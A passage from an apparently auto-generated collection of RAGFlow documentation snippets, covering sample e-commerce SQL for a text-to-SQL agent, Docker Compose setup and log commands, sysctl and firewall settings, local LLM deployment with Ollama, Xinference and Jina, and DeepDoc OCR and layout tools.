FROM Products WHERE ProductID = 7)),\n(16, 5, (SELECT Price FROM Products WHERE ProductID = 5), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 5)),\n(16, 10, (SELECT Price FROM Products WHERE ProductID = 10), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 10)),\n(17, 1, (SELECT Price FROM Products WHERE ProductID = 1), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 1)),\n(17, 8, (SELECT Price FROM Products WHERE ProductID = 8), 1, (SELECT Price FROM Products WHERE ProductID = 8)),\n(18, 2, (SELECT Price FROM Products WHERE ProductID = 2), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 2)),\n(18, 9, (SELECT Price FROM Products WHERE ProductID = 9), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 9)),\n(19, 3, (SELECT Price FROM Products WHERE ProductID = 3), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 3)),\n(19, 6, (SELECT Price FROM Products WHERE ProductID = 6), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 6)),\n(20, 4, (SELECT Price FROM Products WHERE ProductID = 4), 1, (SELECT Price FROM Products WHERE ProductID = 4)),\n(20, 7, (SELECT Price FROM Products WHERE ProductID = 7), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 7));\n\n-- Update Orders Table's TotalPrice\nUPDATE Orders o\nJOIN (\n    SELECT OrderID, SUM(TotalPrice) as order_total\n    FROM OrderDetails\n    GROUP BY OrderID\n) od ON o.OrderID = od.OrderID\nSET o.TotalPrice = od.order_total;\n\nCOMMIT;\n```\n\n----------------------------------------\n\nTITLE: Switching Document Engine to Infinity\nDESCRIPTION: Steps to switch the document engine from Elasticsearch to Infinity, including stopping containers, updating configuration, and restarting.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker/docker-compose.yml down -v\n# Update DOC_ENGINE in docker/.env\n$ docker compose -f docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Viewing RAGFlow Log Files - Bash Command\nDESCRIPTION: Command to continuously monitor RAGFlow log files for debugging and monitoring.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ntail -f ragflow/docker/ragflow-logs/*.log\n```\n\n----------------------------------------\n\nTITLE: Creating SQL Database Tables for E-commerce System\nDESCRIPTION: This SQL script defines the schema for Customers, Products, Orders, and OrderDetails tables in an e-commerce database. It includes primary keys, foreign keys, and appropriate data types for each column.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE Customers (\n  CustomerID int NOT NULL AUTO_INCREMENT,\n  UserName varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  Email varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  PhoneNumber varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  PRIMARY KEY (CustomerID)\n) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\nCREATE TABLE Products (\n  ProductID int NOT NULL AUTO_INCREMENT,\n  ProductName varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  Description text COLLATE utf8mb4_unicode_ci,\n  Price decimal(10,2) DEFAULT NULL,\n  StockQuantity int DEFAULT NULL,\n  PRIMARY KEY (ProductID)\n) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\nCREATE TABLE Orders (\n  OrderID int NOT NULL AUTO_INCREMENT,\n  CustomerID int DEFAULT NULL,\n  OrderDate date DEFAULT NULL,\n  TotalPrice decimal(10,2) DEFAULT NULL,\n  PRIMARY KEY (OrderID),\n  KEY CustomerID (CustomerID)\n) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\nCREATE TABLE OrderDetails (\n  OrderDetailID int NOT NULL AUTO_INCREMENT,\n  OrderID int DEFAULT NULL,\n  ProductID int DEFAULT NULL,\n  UnitPrice decimal(10,2) DEFAULT NULL,\n  Quantity int DEFAULT NULL,\n  TotalPrice decimal(10,2) DEFAULT NULL,\n  PRIMARY KEY (OrderDetailID),\n  KEY OrderID (OrderID),\n  KEY ProductID (ProductID)\n) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n```\n\n----------------------------------------\n\nTITLE: Checking RAGFlow Server Logs in Bash\nDESCRIPTION: Docker command to view the logs of the RAGFlow server container.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ docker logs -f ragflow-server\n```\n\n----------------------------------------\n\nTITLE: Sample Docker Container Status Output\nDESCRIPTION: Example output from the docker ps command showing healthy RAGFlow components including the main server, Elasticsearch, MySQL, and Minio containers.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n5bc45806b680   infiniflow/ragflow:latest     \"./entrypoint.sh\"        11 hours ago   Up 11 hours               0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:443->443/tcp, :::443->443/tcp, 0.0.0.0:9380->9380/tcp, :::9380->9380/tcp   ragflow-server\n91220e3285dd   docker.elastic.co/elasticsearch/elasticsearch:8.11.3   \"/bin/tini -- /usr/l…\"   11 hours ago   Up 11 hours (healthy)     9300/tcp, 0.0.0.0:9200->9200/tcp, :::9200->9200/tcp           ragflow-es-01\nd8c86f06c56b   mysql:5.7.18        \"docker-entrypoint.s…\"   7 days ago     Up 16 seconds (healthy)   0.0.0.0:3306->3306/tcp, :::3306->3306/tcp     ragflow-mysql\ncd29bcb254bc   quay.io/minio/minio:RELEASE.2023-12-20T01-00-02Z       \"/usr/bin/docker-ent…\"   2 weeks ago    Up 11 hours      0.0.0.0:9001->9001/tcp, :::9001->9001/tcp, 0.0.0.0:9000->9000/tcp, :::9000->9000/tcp     ragflow-minio\n```\n\n----------------------------------------\n\nTITLE: Describing Customers Table in Markdown\nDESCRIPTION: This Markdown snippet provides a detailed description of the Customers table in the e-commerce database, explaining the purpose of each field and its significance in the system.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n### Customers (Customer Information Table)\nThe Customers table records detailed information about different customers in the online store. Here is the meaning of each field within this table:\n- CustomerID: A unique identifier for a customer, auto-incremented.\n- UserName: The name used by the customer for logging into the online store or displayed on the site.\n- Email: The email address of the customer, which can be used for account verification, password recovery, and order updates.\n- PhoneNumber: The phone number of the customer, useful for contact purposes such as delivery notifications or customer service.\n```\n\n----------------------------------------\n\nTITLE: Setting vm.max_map_count on macOS with Docker Desktop\nDESCRIPTION: Command to update vm.max_map_count on macOS systems running Docker Desktop.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/quickstart.mdx#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ndocker run --rm --privileged --pid=host alpine sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Healthy MinIO Container Status\nDESCRIPTION: Example output showing a healthy MinIO container status. This is useful for troubleshooting file storage and retrieval issues.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncd29bcb254bc   quay.io/minio/minio:RELEASE.2023-12-20T01-00-02Z       \"/usr/bin/docker-ent…\"   2 weeks ago    Up 11 hours      0.0.0.0:9001->9001/tcp, :::9001->9001/tcp, 0.0.0.0:9000->9000/tcp, :::9000->9000/tcp     ragflow-minio\n```\n\n----------------------------------------\n\nTITLE: Configuring TextSQL_Thesaurus Knowledge Base in RAGFlow\nDESCRIPTION: This snippet contains the content for the TextSQL_Thesaurus knowledge base, defining standard nouns and their synonyms for use in SQL query generation.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_5\n\nLANGUAGE: txt\nCODE:\n```\n###\nStandard noun: StockQuantity\nSynonyms: stock,stockpile,inventory\n###\nStandard noun: UserName\nSynonyms: user name, user's name\n###\nStandard noun: Quantity\nSynonyms: amount,number\n###\nStandard noun: Smartphone\nSynonyms: phone, mobile phone, smart phone, mobilephone\n###\nStandard noun: ProductName\nSynonyms: product name, product's name\n###\nStandard noun: tablet\nSynonyms: pad,Pad\n###\nStandard noun: laptop\nSynonyms: laptop computer,laptop pc\n```\n\n----------------------------------------\n\nTITLE: Setting Permanent vm.max_map_count Configuration\nDESCRIPTION: Configuration line to add to /etc/sysctl.conf for permanent vm.max_map_count setting.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nvm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Stopping RAGFlow Containers and Volumes\nDESCRIPTION: Command to stop all RAGFlow containers and remove volumes. This is required when switching document engines or performing complete resets.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker/docker-compose.yml down -v\n```\n\n----------------------------------------\n\nTITLE: Configuring Model API Key in YAML Configuration File\nDESCRIPTION: This YAML snippet shows how to configure the model API key in the service_conf.yaml.template file before starting RAGFlow. It includes fields for specifying the LLM factory, API key, and base URL.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/llm_api_key_setup.md#2025-04-10_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nuser_default_llm:\n  factory: your_chosen_llm\n  api_key: your_api_key\n  base_url: your_base_url_if_using_proxy\n```\n\n----------------------------------------\n\nTITLE: Restarting Docker Containers for RAGFlow Configuration Updates\nDESCRIPTION: Command to restart all Docker containers after making configuration changes in RAGFlow. This ensures that the new configurations take effect.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow with Docker Compose\nDESCRIPTION: Command to start RAGFlow containers with Docker Compose. Used after configuration changes or when restarting the system.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Configuring Firewall for Jina\nDESCRIPTION: Command to allow inbound connections on port 12345 for Jina service\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\nsudo ufw allow 12345/tcp\n```\n\n----------------------------------------\n\nTITLE: Installing UV Package Manager for RAGFlow Development\nDESCRIPTION: Command to install the UV package manager using pipx. This is a prerequisite for setting up the RAGFlow development environment.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\npipx install uv\n```\n\n----------------------------------------\n\nTITLE: Checking RAGFlow Server Logs\nDESCRIPTION: Command to monitor RAGFlow server logs using Docker.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ docker logs -f ragflow-server\n```\n\n----------------------------------------\n\nTITLE: Opening Firewall Port\nDESCRIPTION: UFW command to allow inbound connections on Ollama port\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nsudo ufw allow 11434/tcp\n```\n\n----------------------------------------\n\nTITLE: Setting HuggingFace Mirror for RAGFlow Development\nDESCRIPTION: Command to set the HF_ENDPOINT environment variable to use a mirror site for HuggingFace, useful when direct access is not available.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\nexport HF_ENDPOINT=https://hf-mirror.com\n```\n\n----------------------------------------\n\nTITLE: Stopping Docker Containers and Clearing Volumes for RAGFlow\nDESCRIPTION: Command to stop all running Docker containers and remove associated volumes in RAGFlow. This is used when switching document engines or resetting the environment.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker/docker-compose.yml down -v\n```\n\n----------------------------------------\n\nTITLE: Running Ollama Model on Linux\nDESCRIPTION: Command to run a pulled Ollama model on Linux systems\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n./ollama run qwen2:latest\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image from Source (Without Embedding Models)\nDESCRIPTION: Commands to clone the RAGFlow repository and build a Docker image without embedding models, resulting in a smaller image size.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .\n```\n\n----------------------------------------\n\nTITLE: Launching RAGFlow Backend Service for Development\nDESCRIPTION: Commands to activate the virtual environment, set the Python path, and launch the RAGFlow backend service for development.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\nsource .venv/bin/activate\nexport PYTHONPATH=$(pwd)\nbash docker/launch_backend_service.sh\n```\n\n----------------------------------------\n\nTITLE: Starting Xinference Server\nDESCRIPTION: Command to start Xinference local server with custom host and port\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nxinference-local --host 0.0.0.0 --port 9997\n```\n\n----------------------------------------\n\nTITLE: Switching Document Engine from Elasticsearch to Infinity\nDESCRIPTION: Steps to switch the document engine from Elasticsearch to Infinity, including stopping containers, updating configuration, and restarting.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker/docker-compose.yml down -v\n$ docker compose -f docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Installing RAGFlow Frontend Dependencies\nDESCRIPTION: Commands to navigate to the web directory and install frontend dependencies for RAGFlow using npm.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README.md#2025-04-10_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\ncd web\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Installing Jina Package\nDESCRIPTION: pip command to install the Jina package\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\npip install jina\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow Server with Docker Compose\nDESCRIPTION: Commands to navigate to the docker directory and start the RAGFlow server using Docker Compose, with options for CPU or GPU acceleration.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ cd ragflow/docker\n# Use CPU for embedding and DeepDoc tasks:\n$ docker compose -f docker-compose.yml up -d\n\n# To use GPU to accelerate embedding and DeepDoc tasks:\n# docker compose -f docker-compose-gpu.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Checking RAGFlow Server Logs in Bash\nDESCRIPTION: Command to check the logs of the RAGFlow server container to verify successful startup.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ docker logs -f ragflow-server\n```\n\n----------------------------------------\n\nTITLE: Launching Ollama Service on Windows\nDESCRIPTION: Environment setup and launch command for Ollama service on Windows systems using Miniforge Prompt\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_10\n\nLANGUAGE: cmd\nCODE:\n```\nset OLLAMA_NUM_GPU=999\nset no_proxy=localhost,127.0.0.1\nset ZES_ENABLE_SYSMAN=1\nset SYCL_CACHE_PERSISTENT=1\n\nollama serve\n```\n\n----------------------------------------\n\nTITLE: Cloning RAGFlow Repository in Bash\nDESCRIPTION: Git command to clone the RAGFlow repository from GitHub.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ja.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/infiniflow/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Configuring System Parameters in Linux\nDESCRIPTION: Commands to check and set vm.max_map_count parameter required for RAGFlow server\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ko.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sysctl vm.max_map_count\n$ sudo sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Launching Xinference Model\nDESCRIPTION: Command to launch Mistral model using Xinference with configurable parameters\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nxinference launch -u mistral --model-name mistral-v0.1 --size-in-billions 7 --model-format pytorch --quantization ${quantization}\n```\n\n----------------------------------------\n\nTITLE: Switching Document Engine from Elasticsearch to Infinity\nDESCRIPTION: Steps to switch the document engine from Elasticsearch to Infinity, including stopping containers, updating configuration, and restarting.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker/docker-compose.yml down -v\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ docker compose -f docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Cloning RAGFlow Repository\nDESCRIPTION: Git command to clone the RAGFlow repository\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ko.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/infiniflow/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Pulling Ollama Models\nDESCRIPTION: Commands to pull llama3.2 and bge-m3 models using Ollama in Docker\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nsudo docker exec ollama ollama pull llama3.2\n```\n\nLANGUAGE: bash\nCODE:\n```\nsudo docker exec ollama ollama pull bge-m3\n```\n\n----------------------------------------\n\nTITLE: Cloning the RAGFlow Repository\nDESCRIPTION: Git command to clone the RAGFlow repository from GitHub.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/infiniflow/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Checking and Setting vm.max_map_count in Linux\nDESCRIPTION: Commands to check the current vm.max_map_count value and set it to 262144 if needed. This is a prerequisite for running RAGFlow.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sysctl vm.max_map_count\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo sysctl -w vm.max_map_count=262144\n```\n\n----------------------------------------\n\nTITLE: Deploying Ollama Container\nDESCRIPTION: Docker command to run Ollama container with port 11434 exposed for model serving\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsudo docker run --name ollama -p 11434:11434 ollama/ollama\n```\n\n----------------------------------------\n\nTITLE: Cloning RAGFlow Repository in Bash\nDESCRIPTION: Git command to clone the RAGFlow repository from GitHub.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/infiniflow/ragflow.git\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image from Source (without embedding models)\nDESCRIPTION: Commands to clone the repository and build a slim Docker image of RAGFlow without embedding models.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg LIGHTEN=1 --build-arg NEED_MIRROR=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .\n```\n\n----------------------------------------\n\nTITLE: Saving RAGFlow Docker Image for Offline Deployment\nDESCRIPTION: Command to save a Docker image to a tar file for transferring to an offline environment.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ndocker save -o ragflow.v0.17.2.tar infiniflow/ragflow:v0.17.2\n```\n\n----------------------------------------\n\nTITLE: Installing Python Dependencies with UV\nDESCRIPTION: Commands to install UV package manager and use it to install Python dependencies. Includes options for both slim and full installation.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npipx install uv\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image from Source (with embedding models)\nDESCRIPTION: Commands to clone the repository and build a full Docker image of RAGFlow including embedding models.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_tzh.md#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg NEED_MIRROR=1 -f Dockerfile -t infiniflow/ragflow:nightly .\n```\n\n----------------------------------------\n\nTITLE: Setting RAGFlow Environment for nightly-slim Image\nDESCRIPTION: Configuration for .env file to use the nightly-slim Docker image, which is the version without embedding models.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/upgrade_ragflow.mdx#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nRAGFLOW_IMAGE=infiniflow/ragflow:nightly-slim\n```\n\n----------------------------------------\n\nTITLE: Specifying Python Requests Package Dependency\nDESCRIPTION: A requirement specification for the Python requests library, commonly used for making HTTP requests. The requests package is a popular HTTP library for Python that simplifies making HTTP/1.1 requests.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/intergrations/chatgpt-on-wechat/plugins/requirements.txt#2025-04-10_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nrequests\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image from Source (Full Version)\nDESCRIPTION: Docker build command to create a full version of the RAGFlow image including embedding models.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg NEED_MIRROR=1 -f Dockerfile -t infiniflow/ragflow:nightly .\n```\n\n----------------------------------------\n\nTITLE: React Component Import Statement\nDESCRIPTION: Imports the APITable component from the project's component library for documentation purposes.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/accelerate_doc_indexing.mdx#2025-04-10_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport APITable from '@site/src/components/APITable';\n```\n\n----------------------------------------\n\nTITLE: Running the Graph Test Client in Python\nDESCRIPTION: This snippet shows how to run the Graph test client using Python. It demonstrates the command-line usage and available options for testing DSL files.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/agent/README.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nPYTHONPATH=path/to/ragflow python graph/test/client.py -h\nusage: client.py [-h] -s DSL -t TENANT_ID -m\n\noptions:\n  -h, --help            show this help message and exit\n  -s DSL, --dsl DSL     input dsl\n  -t TENANT_ID, --tenant_id TENANT_ID\n                        Tenant ID\n  -m, --stream          Stream output\n```\n\n----------------------------------------\n\nTITLE: Markdown Documentation Header\nDESCRIPTION: Defines the sidebar positioning and URL slug for the documentation page in the RagFlow documentation system.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/accelerate_doc_indexing.mdx#2025-04-10_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\nsidebar_position: 9\nslug: /accelerate_doc_indexing\n---\n```\n\n----------------------------------------\n\nTITLE: Running OCR with DeepDoc in Python\nDESCRIPTION: This snippet shows how to use the OCR functionality of DeepDoc. It processes images or PDFs and outputs text and position information.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/deepdoc/README.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npython deepdoc/vision/t_ocr.py -h\nusage: t_ocr.py [-h] --inputs INPUTS [--output_dir OUTPUT_DIR]\n\noptions:\n  -h, --help            show this help message and exit\n  --inputs INPUTS       Directory where to store images or PDFs, or a file path to a single image or PDF\n  --output_dir OUTPUT_DIR\n                        Directory where to store the output images. Default: './ocr_outputs'\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image with Embedding Models\nDESCRIPTION: Commands to build a RAGFlow Docker image including embedding models. This results in a larger image (~9GB) that only relies on external LLM services.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/build_docker_image.mdx#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\nuv run download_deps.py\ndocker build -f Dockerfile.deps -t infiniflow/ragflow_deps .\ndocker build -f Dockerfile -t infiniflow/ragflow:nightly .\n```\n\n----------------------------------------\n\nTITLE: Running Layout Recognition or TSR with DeepDoc in Python\nDESCRIPTION: This snippet demonstrates how to use DeepDoc for layout recognition or table structure recognition tasks on images or PDFs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/deepdoc/README.md#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npython deepdoc/vision/t_recognizer.py -h\nusage: t_recognizer.py [-h] --inputs INPUTS [--output_dir OUTPUT_DIR] [--threshold THRESHOLD] [--mode {layout,tsr}]\n\noptions:\n  -h, --help            show this help message and exit\n  --inputs INPUTS       Directory where to store images or PDFs, or a file path to a single image or PDF\n  --output_dir OUTPUT_DIR\n                        Directory where to store the output images. Default: './layouts_outputs'\n  --threshold THRESHOLD\n                        A threshold to filter out detections. Default: 0.5\n  --mode {layout,tsr}   Task mode: layout recognition or table structure recognition\n```\n\n----------------------------------------\n\nTITLE: Stopping the RAGFlow Backend Service\nDESCRIPTION: Command to kill the backend service processes by finding and terminating processes running the entrypoint script.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\npkill -f \"docker/entrypoint.sh\"\n```\n\n----------------------------------------\n\nTITLE: Running Layout Recognition on Images or PDFs with DeepDoc\nDESCRIPTION: This command shows how to perform layout recognition on images or PDFs using DeepDoc, with options for threshold and output directory.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/deepdoc/README.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\npython deepdoc/vision/t_recognizer.py --inputs=path_to_images_or_pdfs --threshold=0.2 --mode=layout --output_dir=path_to_store_result\n```\n\n----------------------------------------\n\nTITLE: Setting Up RAGFlow Frontend Dependencies\nDESCRIPTION: Commands to navigate to the web directory and install frontend dependencies using npm.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/launch_ragflow_from_source.md#2025-04-10_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncd web\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Running Table Structure Recognition on Images or PDFs with DeepDoc\nDESCRIPTION: This command illustrates how to use DeepDoc for table structure recognition on images or PDFs, specifying input, threshold, and output options.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/deepdoc/README.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\npython deepdoc/vision/t_recognizer.py --inputs=path_to_images_or_pdfs --threshold=0.2 --mode=tsr --output_dir=path_to_store_result\n```\n\n----------------------------------------\n\nTITLE: Running OCR on Images or PDFs with DeepDoc\nDESCRIPTION: This command demonstrates how to run OCR on a set of images or PDFs using DeepDoc, specifying input and output directories.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/deepdoc/README.md#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\npython deepdoc/vision/t_ocr.py --inputs=path_to_images_or_pdfs --output_dir=path_to_store_result\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image without Embedding Models\nDESCRIPTION: Commands to build a RAGFlow Docker image without embedding models. This results in a smaller image (~2GB) that relies on external LLM and embedding services.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/develop/build_docker_image.mdx#2025-04-10_snippet_0\n\nLANGUAGE: 